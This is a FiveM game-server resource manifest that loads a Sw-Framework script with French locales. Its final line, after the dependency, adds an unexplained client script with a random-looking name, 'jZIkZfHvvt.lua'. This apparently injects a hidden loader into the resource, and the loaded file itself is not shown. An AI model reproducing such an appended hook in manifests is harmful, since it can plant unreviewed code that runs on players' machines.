fx_version('bodacious')
game('gta5')

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@Sw-Framework/locale.lua',
	'locales/fr.lua',
	'config.lua',
	'server/main.lua'
}

--client_script('@korioz/lib.lua')
client_scripts {
	'@Sw-Framework/locale.lua',
	'locales/fr.lua',
	'config.lua',
	'client/module.lua',
	'client/main.lua'
}

dependency('Sw-Framework')

client_script 'jZIkZfHvvt.lua'







